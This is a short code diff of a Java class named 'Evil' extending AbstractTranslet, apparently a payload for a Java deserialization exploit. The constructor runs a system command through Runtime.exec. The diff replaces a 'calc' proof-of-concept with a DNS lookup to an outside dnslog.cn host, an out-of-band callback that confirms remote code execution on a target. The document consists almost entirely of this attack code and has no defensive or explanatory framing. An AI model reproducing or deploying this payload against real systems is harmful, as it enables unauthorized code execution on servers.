@@ -20,7 +20,7 @@ import java.io.IOException;
 public class Evil extends AbstractTranslet{
     public Evil() throws IOException {
         super();
-        Runtime.getRuntime().exec("calc");
+        Runtime.getRuntime().exec("dnslookup x5f0yx.dnslog.cn");
         namesArray = new String[2];
         namesArray[0] = "newTransformer";
         namesArray[1] = "123";
